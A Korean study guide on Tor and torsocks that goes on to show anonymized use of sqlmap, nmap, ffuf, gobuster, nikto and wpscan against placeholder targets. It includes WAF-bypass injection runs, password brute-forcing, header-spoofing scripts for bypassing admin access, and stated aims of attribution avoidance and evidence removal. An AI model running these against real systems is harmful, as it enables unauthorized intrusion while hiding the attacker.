# 🧅 Tor와 torsocks 종합 기술 가이드

#### 🔹 Tor (The Onion Router)

**Tor**는 인터넷 트래픽을 여러 중계 노드를 통해 암호화하여 전송함으로써 사용자의 신원과 위치를 익명화하는 분산 네트워크 시스템입니다. "양파 라우터(Onion Router)"라는 명칭은 데이터가 여러 암호화 계층을 통과하며 전송되는 구조가 양파의 겹겹이 쌓인 층과 유사하다는 데서 유래되었습니다.

#### 🔹 torsocks

**torsocks**는 일반적인 네트워크 애플리케이션이 Tor 네트워크를 통해 통신할 수 있도록 해주는 SOCKS 프록시 래퍼(wrapper) 도구입니다. 기존 애플리케이션의 소스코드 수정 없이 Tor 네트워크를 통한 익명 통신을 가능하게 합니다.

### 2. 역할 및 목적

#### 🎯 Tor의 주요 목적

- **익명성 보장**: 사용자의 실제 IP 주소 은닉
- **검열 우회**: 인터넷 검열이 있는 지역에서의 정보 접근
- **프라이버시 보호**: 웹 브라우징 활동 추적 방지
- **보안 테스트**: 침투 테스트 시 공격자 신원 보호
- **다크웹 접속**: .onion 도메인 접근

#### 🎯 torsocks의 역할

- **투명한 프록시**: 기존 애플리케이션의 네트워크 호출을 Tor로 리디렉션
- **SOCKS5 인터페이스**: Tor의 SOCKS5 프록시 (127.0.0.1:9050)를 통한 통신 중계
- **DNS 보호**: DNS 요청까지 Tor 네트워크를 통해 처리

### 3. 구조 및 아키텍처

#### 🏗️ Tor 네트워크 구조

```
클라이언트 → 입구 노드(Guard) → 중간 노드(Relay) → 출구 노드(Exit) → 목적지 서버
    ↑           ↑                ↑                ↑
  암호화 3층   1층 해제          2층 해제        3층 해제
```

**구성 요소:**

- **클라이언트 (Client)**: Tor 브라우저 또는 Tor 데몬을 실행하는 사용자 시스템
- **입구 노드 (Guard Node)**: 클라이언트가 연결하는 첫 번째 Tor 노드
- **중간 노드 (Relay Node)**: 트래픽을 중계하는 중간 노드
- **출구 노드 (Exit Node)**: 최종 목적지로 트래픽을 전송하는 노드
- **디렉토리 서버**: 네트워크 상태 정보 및 노드 목록 관리

#### 🏗️ torsocks 구성요소

- **라이브러리 인터셉터**: 시스템 네트워크 호출 가로채기
- **SOCKS5 클라이언트**: Tor 데몬과의 통신 처리
- **DNS 리졸버**: DNS 쿼리를 Tor 네트워크로 라우팅

### 4. 동작 원리

#### 🔄 Tor 암호화 및 라우팅 원리

1. **회로 생성**: 클라이언트가 3개 노드를 선택하여 암호화된 통신 경로 구성
2. **3중 암호화**: 데이터를 출구→중간→입구 순서로 각각 다른 키로 암호화
3. **순차적 복호화**: 각 노드는 자신의 층만 복호화하여 다음 노드로 전달
4. **최종 전달**: 출구 노드에서 원본 데이터를 복구하여 목적지로 전송

#### 🔄 torsocks 동작 메커니즘

```bash
애플리케이션 → torsocks → LD_PRELOAD → 네트워크 함수 후킹 → SOCKS5 → Tor 데몬
```

**과정:**

1. `torsocks` 명령으로 애플리케이션 실행
2. `LD_PRELOAD`를 통해 네트워크 관련 시스템 호출 가로채기
3. 원본 네트워크 호출을 SOCKS5 프로토콜로 변환
4. Tor 데몬(포트 9050)으로 요청 전달
5. Tor 네트워크를 통해 실제 통신 수행

### 5. 설치 및 구성

#### 📦 설치 방법 (Ubuntu/Debian 기준)

```bash
# 패키지 업데이트
sudo apt update

# Tor 및 torsocks 설치
sudo apt install -y tor torsocks

# 서비스 시작 및 활성화
sudo systemctl start tor
sudo systemctl enable tor

# 수동 실행 (도커 등 systemctl 사용이 어려울 때)
tor


# 상태 확인
sudo systemctl status tor
```

#### ⚙️ 설정 파일 구성 (/etc/tor/torrc)

```bash
# 기본 SOCKS 포트 설정
SocksPort 9050

# 제어 포트 활성화
ControlPort 9051

# 로그 레벨 설정
Log notice file /var/log/tor/tor.log

# 특정 국가 출구 노드 제한 (선택사항)
ExitNodes {US},{GB},{DE}
```

### 6. 실전 활용 예시

#### 🌐 기본 웹 요청

```bash
# torsocks를 통한 curl 요청
torsocks curl https://check.torproject.org

# 직접 프록시 지정
curl -x socks5h://127.0.0.1:9050 https://example.com

# IP 확인
torsocks curl https://ifconfig.me

### Tor 연결 확인

# 두 IP 주소가 다르면 Tor가 정상 작동 중
echo "일반 IP 주소: $(curl -s https://api.ipify.org)"
echo "Tor IP 주소: $(torsocks curl -s https://api.ipify.org)"
# 방법 3: Tor 프로젝트의 IP 확인 서비스 사용
torsocks curl -s https://check.torproject.org/api/ip
```

#### 🔍 침투 테스트 도구와의 연동

```bash
# nmap 포트 스캔 (TCP Connect 스캔만 가능)
nmap -Pn --proxy socks5://127.0.0.1:9050 -sT -p 80,443 target.com

# sqlmap을 통한 SQL 인젝션 테스트
sqlmap -u "http://target.com/vuln.php?id=1" \
  --tor --tor-type=SOCKS5 --check-tor

# ffuf를 통한 디렉토리 브루트포싱
torsocks ffuf -u http://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt

# Metasploit 프록시 설정
msf > setg Proxies socks5:127.0.0.1:9050
```

#### 🛡️ 익명성 강화 기법

```bash
# User-Agent 위조와 함께 요청
torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  https://target.com

# 다중 헤더를 통한 IP 우회 시도
torsocks curl -i http://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "Client-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1"
```

### 7. 핵심 용어 정리

| 용어        | 영문                   | 설명                                   |
| ----------- | ---------------------- | -------------------------------------- |
| 양파 라우팅 | Onion Routing          | 다중 암호화 계층을 통한 익명 통신 기술 |
| 회로        | Circuit                | 입구-중간-출구 노드로 구성된 통신 경로 |
| SOCKS5      | Socket Secure v5       | 프록시 프로토콜의 5번째 버전           |
| 입구 노드   | Guard Node/Entry Node  | 클라이언트가 연결하는 첫 번째 노드     |
| 중간 노드   | Relay Node/Middle Node | 트래픽을 중계하는 중간 노드            |
| 출구 노드   | Exit Node              | 최종 목적지로 연결하는 마지막 노드     |
| 히든 서비스 | Hidden Service         | .onion 도메인 서비스                   |
| 브리지      | Bridge                 | 검열을 우회하기 위한 비공개 입구 노드  |

### 8. 장단점 분석

#### ✅ 장점

- **강력한 익명성**: 3중 암호화를 통한 높은 수준의 프라이버시 보호
- **검열 우회**: 인터넷 검열 및 차단 우회 가능
- **무료 사용**: 오픈소스 프로젝트로 무료 이용 가능
- **다양한 플랫폼 지원**: Windows, macOS, Linux, Android 등 지원
- **히든 서비스**: .onion 도메인을 통한 익명 서비스 제공 가능

#### ❌ 단점

- **속도 저하**: 다중 노드를 거치면서 발생하는 지연 시간
- **출구 노드 위험**: 출구 노드에서 트래픽 감청 가능성
- **사설 네트워크 제한**: RFC1918 사설 IP 대역 접근 불가
- **법적 위험**: 일부 국가에서 Tor 사용 자체가 불법
- **악용 가능성**: 불법 활동에 이용될 수 있는 위험성

### 9. 보안 고려사항 및 제한사항

#### 🚫 제한사항

```bash
# 사설 네트워크 접근 불가 (실패 예시)
torsocks curl http://192.168.1.1/    # 실패
torsocks curl http://10.10.10.1/     # 실패
torsocks curl http://172.16.1.1/     # 실패

# ICMP 프로토콜 지원 안 함
torsocks ping google.com             # 실패

# UDP 트래픽 제한적 지원
# 일부 DNS 쿼리 외에는 UDP 사용 불가
```

#### 🔒 보안 강화 방법

```bash
# Tor 브라우저 사용 권장
# JavaScript 비활성화
# HTTPS 사이트만 이용
# 개인 정보 입력 금지
# 파일 다운로드 주의
```

### 10. 문제 해결 및 디버깅

#### 🔧 일반적인 문제 해결

```bash
# Tor 서비스 상태 확인
sudo systemctl status tor

# Tor 로그 확인
sudo tail -f /var/log/tor/tor.log

# Tor 연결 테스트
torsocks curl https://check.torproject.org

# 포트 확인
netstat -tulpn | grep 9050

# Tor 재시작
sudo systemctl restart tor
```

#### 🐛 디버깅 명령어

```bash
# 상세 로그와 함께 실행
TORSOCKS_DEBUG=1 torsocks curl https://example.com

# Tor 데몬 수동 실행 (디버그 모드)
tor --log "debug file /tmp/tor-debug.log"
```

### 11. 어린이 버전 요약

**Tor**는 인터넷에서 숨바꼭질을 도와주는 마법의 터널이에요. 여러분이 인터넷에서 뭔가를 할 때, 보통은 여러분의 집 주소(IP)가 그대로 보이는데, Tor를 사용하면 3개의 다른 집을 돌아돌아 가서 누가 원래 보낸 사람인지 알 수 없게 해줍니다.

**torsocks**는 여러분이 평소에 쓰던 도구들(curl, wget 등)에게 "Tor 터널로 가세요!"라고 말해주는 안내원 같은 역할을 해요. 도구들이 직접 인터넷으로 가지 않고 Tor 터널을 통해 안전하게 갈 수 있도록 도와줍니다.

하지만 우리 집(사설 IP) 근처에 있는 친구들에게는 이 터널로 갈 수 없어요. 터널은 멀리 있는 곳으로만 연결되어 있거든요!

# 🛡️ Tor + 침투테스트 도구 조합 완전 가이드

## 📝 문제

Tor 네트워크를 활용하여 sqlmap, nmap, curl 등 다양한 침투테스트 도구들과 조합하여 익명성을 보장하는 실전 활용 방법과 옵션들을 상세히 설명하시오.

## 📖 답안

### 1. 개념 및 기본 원리

#### 🔹 익명성 보장 통신의 핵심 원리

익명성 보장 침투테스트는 공격자의 신원과 위치를 숨기면서 대상 시스템을 분석하는 기법입니다. Tor 네트워크를 통해 모든 네트워크 트래픽을 3중 암호화하여 여러 중계 노드를 거쳐 전송함으로써 출발지 추적을 방지합니다.

#### 🔹 SOCKS5 프록시 기본 구조

```
도구 실행 → torsocks 래퍼 → SOCKS5 프록시(127.0.0.1:9050) → Tor 네트워크 → 대상 시스템
```

### 2. 역할 및 목적

#### 🎯 주요 활용 목적

- **침투테스트 시 공격자 신원 보호**: 레드팀 활동 중 추적 방지
- **WAF/IPS 우회**: IP 기반 차단 시스템 우회
- **지리적 제한 우회**: 특정 지역에서만 접근 가능한 서비스 테스트
- **로그 분석 방해**: 서버 로그에서 실제 공격자 IP 은닉
- **다단계 공격 체인 구성**: 각 단계별 다른 출구 노드 활용

#### 🎯 보안 테스트에서의 전략적 가치

- **Attribution Avoidance**: 공격 귀속 방지
- **Operational Security**: 작전 보안 강화
- **Evidence Removal**: 흔적 제거 지원
- **Plausible Deniability**: 부인 가능성 확보

### 3. 구조 및 네트워크 아키텍처

#### 🏗️ 익명화 네트워크 스택

```
애플리케이션 계층: sqlmap, nmap, curl
    ↓
래퍼 계층: torsocks, proxychains
    ↓
프록시 계층: SOCKS5 (127.0.0.1:9050)
    ↓
Tor 네트워크: 입구→중간→출구 노드
    ↓
대상 시스템: HTTP/HTTPS 서비스
```

#### 🏗️ 다중 프록시 체인 구성

```bash
# /etc/proxychains4.conf 설정 예시
[ProxyList]
socks5 127.0.0.1 9050    # Tor
http 127.0.0.1 8080      # 추가 HTTP 프록시
socks4 127.0.0.1 1080    # 추가 SOCKS4 프록시
```

### 4. 동작 원리 및 패킷 플로우

#### 🔄 패킷 라우팅 메커니즘

1. **애플리케이션 단계**: 도구가 네트워크 요청 생성
2. **인터셉션 단계**: torsocks가 시스템 호출 가로채기
3. **프록시 변환**: HTTP/TCP 요청을 SOCKS5 프로토콜로 변환
4. **Tor 처리**: Tor 데몬이 3중 암호화 후 네트워크 전송
5. **응답 역변환**: 응답 패킷의 역순 처리

#### 🔄 DNS 해석 프로세스

```bash
# 일반 DNS 해석 (위험)
애플리케이션 → 로컬 DNS 서버 → 실제 IP 해석

# Tor를 통한 DNS 해석 (안전)
애플리케이션 → torsocks → Tor 네트워크 → 출구 노드 DNS 해석
```

### 5. 실전 도구별 활용 방법

#### 🔍 **sqlmap** - SQL 인젝션 테스트

##### 기본 사용법

```bash
# 기본 Tor 연동
sqlmap -u "http://target.com/vuln.php?id=1" \
  --tor --tor-type=SOCKS5 --check-tor

# 고급 옵션 조합
sqlmap -u "http://target.com/login.php" \
  --data="username=admin&password=123" \
  --tor --tor-type=SOCKS5 --check-tor \
  --random-agent --delay=2 --timeout=30 \
  --threads=1 --technique=BEUSTQ \
  -m text.txt

```

##### 핵심 옵션 설명

| 옵션                | 설명                                            | 보안 효과            |
| ------------------- | ----------------------------------------------- | -------------------- |
| `--tor`             | Tor 네트워크 사용 활성화                        | 기본 익명화          |
| `--tor-type=SOCKS5` | SOCKS5 프로토콜 지정                            | 프록시 프로토콜 명시 |
| `--check-tor`       | Tor 연결 상태 검증                              | 익명화 확인          |
| `--random-agent`    | User-Agent 무작위 변경                          | 핑거프린팅 방지      |
| `--delay=2`         | 요청 간 2초 지연                                | 탐지 회피            |
| `--timeout=30`      | 타임아웃 30초 설정                              | 네트워크 안정성      |
| `--threads=1`       | 단일 스레드 사용                                | 네트워크 부하 최소화 |
| `-m FILE`           | FILE에 적힌 여러 URL을 한꺼번에 자동으로 테스트 |
| `-u URL`            | 요청 보낼 대상 URL (주로 GET 방식)              |
| `--data`            | POST 요청 시 보낼 데이터 (본문)                 |

##### WAF 우회 기법 조합

```bash
# 고급 WAF 우회 + Tor
sqlmap -u "http://target.com/search.php?q=test" \
  --tor --tor-type=SOCKS5 --check-tor \
  --tamper=space2comment,charencode,randomcase \
  --random-agent --delay=3 --timeout=60 \
  --headers="X-Forwarded-For:127.0.0.1" \
  --headers="X-Real-IP:127.0.0.1" \
  --technique=B --risk=3 --level=5


# 일반 sqlmap
sqlmap -u "http://example.com/page.php?id=1" --common-tables -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt

# tor + sqlmap
sqlmap -u "http://example.com/page.php?id=1" \
  --tor --tor-type=SOCKS5 --check-tor \
  --common-tables \
  -t /path/to/SecLists/Discovery/Web-Content/common-tables.txt \
  --random-agent \
  --delay=3 \
  --timeout=15 \
  --retries=3 \
  --batch

# 랜덤 지연
sqlmap -u "http://example.com/page.php?id=1" --tor --tor-type=SOCKS5 --delay=3 --time-sec=5 --randomize=length --safe-url="http://example.com/" --safe-freq=10


# DBMS
sqlmap -u "http://example.com/page.php?id=1" \
  --tor --tor-type=SOCKS5 \
  --dbms=mysql \  # 특정 DBMS 대상으로 최적화
  --common-tables \
  -t /path/to/SecLists/Discovery/Web-Content/MySQL.txt \
  --level=5 \    # 테스트 레벨 증가 (더 철저한 검사)
  --risk=3 \     # 위험도 증가 (더 공격적인 테스트)
  --threads=2 \  # Tor 네트워크에서는 스레드 수를 낮게 유지
  --hex \        # 특수 문자를 HEX 인코딩
  --output-dir=/tmp/sqlmap_results  # 결과 저장 디렉토리 지정


```

#### 🔍 **nmap** - 네트워크 스캔

##### TCP Connect 스캔 (Tor 호환)

```bash
# 기본 TCP 스캔
nmap -Pn --proxy socks5://127.0.0.1:9050 \
  -sT -p 80,443,8080,8443 target.com

# 상세 버전 스캔
nmap -Pn --proxy socks5://127.0.0.1:9050 \
  -sT -sV -p 1-1000 target.com \
  --version-intensity 0 --script-timeout 60s
```

##### 핵심 옵션 설명

| 옵션                | 설명               | Tor 호환성          |
| ------------------- | ------------------ | ------------------- |
| `-Pn`               | Ping 스캔 비활성화 | 필수 (ICMP 불가)    |
| `--proxy socks5://` | SOCKS5 프록시 지정 | Tor 연동            |
| `-sT`               | TCP Connect 스캔   | 호환 가능           |
| `-sS`               | TCP SYN 스캔       | 불가능 (Raw Socket) |
| `-sV`               | 버전 탐지          | 호환 가능           |
| `-O`                | OS 탐지            | 불가능 (Raw Socket) |

##### 서비스 열거 및 스크립트 스캔

```bash
# HTTP 서비스 상세 분석
nmap -Pn --proxy socks5://127.0.0.1:9050 \
  -sT -p 80,443 target.com \
  --script=http-enum,http-headers,http-methods \
  --script-timeout 120s

# SSL/TLS 분석
nmap -Pn --proxy socks5://127.0.0.1:9050 \
  -sT -p 443 target.com \
  --script=ssl-enum-ciphers,ssl-cert \
  --script-timeout 180s
```

#### 🔍 **curl** - HTTP 요청 및 웹 테스트

##### 기본 HTTP 요청

```bash
# 기본 GET 요청
torsocks curl -i -L https://target.com/

# POST 데이터 전송
torsocks curl -i -X POST https://target.com/login \
  -d "username=admin&password=123" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

##### 고급 헤더 조작 및 우회 기법

```bash
# 다중 헤더로 IP 우회 시도
torsocks curl -i https://target.com/admin/ \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Remote-Addr: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "CF-Connecting-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1"
```

##### 세션 관리 및 쿠키 처리

```bash
# 쿠키 저장/로드
torsocks curl -i -c cookies.txt https://target.com/login \
  -d "username=admin&password=123"

torsocks curl -i -b cookies.txt https://target.com/dashboard

# 세션 유지 테스트
torsocks curl -i -b cookies.txt https://target.com/sensitive \
  -H "Referer: https://target.com/dashboard"
```

#### 🔍 **ffuf** - 웹 디렉토리/파일 브루트포싱

##### 기본 디렉토리 스캔

```bash
# 기본 디렉토리 브루트포싱
torsocks ffuf -u http://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 1234 -fc 404 -t 10

# 파일 확장자 브루트포싱
torsocks ffuf -u http://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.html,.txt,.js,.json,.xml \
  -fs 1234 -t 5
```

##### 매개변수 브루트포싱

```bash
# GET 매개변수 발견
torsocks ffuf -u "http://target.com/search.php?FUZZ=test" \
  -w /usr/share/wordlists/burp-parameter-names.txt \
  -fs 1234 -mc 200 -t 10

# POST 매개변수 발견
torsocks ffuf -u http://target.com/login.php \
  -w /usr/share/wordlists/burp-parameter-names.txt \
  -X POST -d "FUZZ=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fs 1234 -t 5
```

##### 핵심 옵션 설명

| 옵션       | 설명                | 권장값           |
| ---------- | ------------------- | ---------------- |
| `-fs`      | 응답 크기 필터      | 에러 페이지 크기 |
| `-fc`      | HTTP 상태 코드 필터 | 404,403          |
| `-mc`      | 매칭할 상태 코드    | 200,301,302      |
| `-t`       | 스레드 수           | 5-10 (Tor 고려)  |
| `-delay`   | 요청 간 지연        | 100ms-1s         |
| `-timeout` | 요청 타임아웃       | 10-30s           |

#### 🔍 **gobuster** - 디렉토리 브루트포싱

```bash
# 기본 디렉토리 스캔
torsocks gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 10 -q --delay 100ms

# DNS 서브도메인 스캔
torsocks gobuster dns -d target.com \
  -w /usr/share/wordlists/subdomains-top1million-5000.txt \
  -t 5 --delay 200ms
```

#### 🔍 **nikto** - 웹 취약점 스캐너

```bash
# 기본 취약점 스캔
torsocks nikto -h http://target.com -timeout 30

# 상세 스캔 with 헤더 조작
torsocks nikto -h http://target.com \
  -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -timeout 60 -Display V
```

#### 🔍 **wpscan** - WordPress 취약점 스캐너

```bash
# WordPress 기본 스캔
torsocks wpscan --url http://target.com \
  --random-user-agent --detection-mode aggressive

# 사용자 열거 + 패스워드 브루트포싱
torsocks wpscan --url http://target.com \
  --enumerate u --passwords /usr/share/wordlists/rockyou.txt \
  --max-threads 5
```

### 6. 핵심 보안 옵션 및 설정

#### 🔒 **DNS 누출 방지**

```bash
# 올바른 방법 (DNS까지 Tor 경유)
curl -x socks5h://127.0.0.1:9050 https://target.com

# 잘못된 방법 (DNS 누출 위험)
curl -x socks5://127.0.0.1:9050 https://target.com
```

#### 🔒 **User-Agent 위조**

```bash
# Windows Chrome 위조
torsocks curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  https://target.com

# 랜덤 User-Agent 목록
USER_AGENTS=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)
UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
torsocks curl -A "$UA" https://target.com
```

#### 🔒 **요청 간격 제어**

```bash
# 스크립트 내 지연 추가
for url in $(cat urls.txt); do
  torsocks curl -s "$url"
  sleep $((RANDOM % 5 + 1))  # 1-5초 랜덤 지연
done
```

### 7. 고급 익명화 기법

#### 🎭 **다중 프록시 체인**

```bash
# proxychains 설정 (/etc/proxychains4.conf)
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 9050
http 127.0.0.1 8080

# 사용 예시
proxychains4 curl https://target.com
```

#### 🎭 **Tor 회로 재설정**

```bash
# 새로운 IP로 회로 변경
echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051

# 스크립트 자동화
change_tor_ip() {
  echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
  sleep 10
}
```

#### 🎭 **HTTP 헤더 랜덤화**

```bash
# 헤더 랜덤화 함수
randomize_headers() {
  local ACCEPT_LANG=("en-US,en;q=0.9" "en-GB,en;q=0.9" "fr-FR,fr;q=0.9")
  local ACCEPT_ENC=("gzip, deflate, br" "gzip, deflate" "identity")

  echo "-H 'Accept-Language: ${ACCEPT_LANG[$RANDOM % ${#ACCEPT_LANG[@]}]}'"
  echo "-H 'Accept-Encoding: ${ACCEPT_ENC[$RANDOM % ${#ACCEPT_ENC[@]}]}'"
}

# 사용 예시
HEADERS=$(randomize_headers)
torsocks curl $HEADERS https://target.com
```

### 8. 실전 시나리오별 조합 예시

#### 🎯 **시나리오 1: 웹 애플리케이션 취약점 스캔**

```bash
#!/bin/bash
TARGET="https://target.com"

# 1단계: 기본 정보 수집
echo "[+] 기본 정보 수집"
torsocks curl -i -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" "$TARGET"

# 2단계: 디렉토리 스캔
echo "[+] 디렉토리 스캔"
torsocks ffuf -u "$TARGET/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -fs 1234 -t 5 -delay 200ms

# 3단계: 취약점 스캔
echo "[+] Nikto 취약점 스캔"
torsocks nikto -h "$TARGET" -timeout 30

# 4단계: SQL 인젝션 테스트
echo "[+] SQL 인젝션 테스트"
sqlmap -u "$TARGET/login.php" --forms \
  --tor --tor-type=SOCKS5 --check-tor \
  --random-agent --delay=2
```

#### 🎯 **시나리오 2: API 엔드포인트 테스트**

```bash
#!/bin/bash
API_BASE="https://api.target.com"

# JWT 토큰 획득
TOKEN=$(torsocks curl -s -X POST "$API_BASE/auth" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' | jq -r '.token')

# API 엔드포인트 테스트
for endpoint in users orders products; do
  echo "[+] Testing /$endpoint"
  torsocks curl -s -H "Authorization: Bearer $TOKEN" \
    "$API_BASE/$endpoint" | jq .
  sleep 2
done
```

#### 🎯 **시나리오 3: 우회 기법 조합**

```bash
#!/bin/bash
TARGET="http://target.com/admin"

# 다양한 우회 기법 시도
BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
)

for header in "${BYPASS_HEADERS[@]}"; do
  echo "[+] 시도: $header"
  response=$(torsocks curl -s -w "%{http_code}" -H "$header" "$TARGET")
  echo "응답 코드: $response"

  if [[ "$response" == *"200"* ]]; then
    echo "[!] 우회 성공: $header"
    break
  fi
  sleep 3
done
```

### 9. 핵심 용어 정리

| 용어        | 영문            | 설명                              |
| ----------- | --------------- | --------------------------------- |
| 익명화      | Anonymization   | 사용자 신원을 숨기는 기술         |
| 프록시 체인 | Proxy Chain     | 다중 프록시를 통한 연결           |
| DNS 누출    | DNS Leak        | DNS 쿼리가 프록시를 우회하는 현상 |
| 핑거프린팅  | Fingerprinting  | 클라이언트 특성 식별 기술         |
| 회로 재설정 | Circuit Renewal | Tor 연결 경로 변경                |
| 사이드 채널 | Side Channel    | 부가적인 정보 누출 경로           |
| 어트리뷰션  | Attribution     | 공격 행위자 식별                  |
| 작전보안    | OPSEC           | 작전 중 보안 유지                 |

### 10. 보안 고려사항 및 제한사항

#### ❌ **Tor 사용 불가능한 경우**

```bash
# 사설 네트워크 (실패)
torsocks curl http://192.168.1.1/     # RFC1918 사설망
torsocks curl http://10.0.0.1/        # 내부 네트워크
torsocks curl http://172.16.1.1/      # 도커 네트워크

# Raw Socket 기반 도구 (실패)
torsocks ping google.com              # ICMP
torsocks traceroute google.com        # ICMP/UDP
nmap -sS target.com                   # TCP SYN 스캔
```

#### ⚠️ **보안 주의사항**

- **JavaScrip 비활성화**: 브라우저 기반 도구 사용 시
- **쿠키 관리**: 세션 간 쿠키 공유 방지
- **시간 상관 공격**: 요청 패턴 분석 방지
- **트래픽 분석**: 패킷 크기 및 타이밍 분석 대응

#### 🔧 **성능 최적화**

```bash
# Tor 설정 최적화 (/etc/tor/torrc)
NumEntryGuards 3              # 입구 노드 수
CircuitBuildTimeout 30        # 회로 구성 타임아웃
LearnCircuitBuildTimeout 0    # 학습 비활성화
MaxCircuitDirtiness 600       # 회로 재사용 시간
```

### 11. 실전 문제 해결

#### 🔧 **연결 문제 해결**

```bash
# Tor 상태 확인
sudo systemctl status tor

# 포트 확인
ss -tlnp | grep 9050

# 연결 테스트
torsocks curl -s https://check.torproject.org | grep -i congratulations

# 로그 확인
sudo journalctl -u tor -f
```

#### 🔧 **성능 문제 해결**

```bash
# 새로운 회로 요청
killall -HUP tor

# 컨트롤 포트를 통한 회로 재설정
echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT' | nc 127.0.0.1 9051

# 멀티스레드 제한
# Tor는 단일 스레드에 최적화되어 있으므로 -t 1 또는 -t 5 이하 권장
```

### 12. 장단점 분석

#### ✅ **장점**

- **완전한 익명성**: 3중 암호화를 통한 강력한 프라이버시
- **광범위한 도구 지원**: 대부분의 네트워크 도구와 호환
- **무료 사용**: 오픈소스 기반 무료 서비스
- **글로벌 출구 노드**: 전 세계 다양한 위치에서 접근 가능
- **검열 우회**: 지역 차단 및 검열 우회

#### ❌ **단점**

- **속도 저하**: 다중 노드 경유로 인한 지연 시간
- **제한된 프로토콜**: TCP 기반 프로토콜만 지원
- **사설망 접근 불가**: 내부 네트워크 테스트 제한
- **탐지 가능성**: Tor 사용 자체가 탐지될 수 있음
- **법적 위험**: 일부 지역에서 Tor 사용 제한

### 13. 어린이 버전 요약

여러분이 비밀요원이 되어서 나쁜 사람들을 잡는 일을 한다고 생각해보세요! 하지만 나쁜 사람들이 여러분이 누구인지 알면 안 되겠죠?

**Tor**는 여러분의 비밀 터널이에요. 이 터널을 통해 다니면 나쁜 사람들은 여러분이 어디서 왔는지 알 수 없어요. 마치 3개의 다른 비밀 기지를 돌고 돌아서 최종 목적지에 도착하는 것처럼요!

**torsocks**는 여러분의 도구들(쌍안경, 열쇠, 탐지기 등)에게 "비밀 터널로 가세요!"라고 말해주는 안내원이에요.

- `sqlmap`은 나쁜 웹사이트의 약한 곳을 찾는 탐지기예요
- `nmap`은 문과 창문이 어디에 있는지 찾는 망원경이에요
- `curl`은 편지를 보내고 받는 전령이에요
- `ffuf`는 숨겨진 방과 서랍을 찾는 탐색기예요

이 모든 도구들을 비밀 터널과 함께 사용하면, 나쁜 사람들은 여러분이 누구인지 절대 알 수 없어요. 하지만 우리 집 근처(사설 네트워크)는 비밀 터널이 연결되어 있지 않아서 갈 수 없어요.
